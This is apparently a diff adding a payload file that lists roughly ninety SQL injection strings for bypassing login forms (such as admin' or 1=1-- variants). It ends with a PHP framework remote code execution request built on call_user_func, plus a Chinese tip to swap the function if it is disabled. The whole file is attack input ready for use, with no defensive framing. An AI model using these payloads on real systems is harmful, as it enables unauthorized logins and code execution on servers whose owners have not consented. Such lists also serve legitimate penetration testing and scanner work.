@@ -1,0 +1,95 @@
+'or 1=1/*
+"or "a"="a
+"or 1=1--
+"or"="
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or ''-'
+" or ""-"
+" or true--
+' or true--
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+"or"="a'='a
+"or1=1--
+"or=or"
+''or'='or'
+') or ('a'='a
+'.).or.('.a.'='.a
+'or 1=1
+'or 1=1--
+'or 1=1/*
+'or"="a'='a
+'or' '1'='1'
+'or''='
+'or''=''or''='
+'or'='1'
+'or'='or'
+'or.'a.'='a
+'or1=1--
+1'or'1'='1
+a'or' 1=1--
+a'or'1=1--
+or 'a'='a'
+or 1=1--
+or1=1--
+1'or'1'='1
+admin' or 1=1/*
+"or "a"="a
+'.).or.('.a.'='.a 
+or 1=1--
+'or 1=1--
+'or' 1=1--
+"or 1=1--
+'or.'a.'='a
+"or"="a'='a
+'or''='
+'or'='or'
+admin'or 1=1#
+
+
+
+
+_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
+ 
+不成功时，把call_user_func换个函数，可能是被禁用掉了
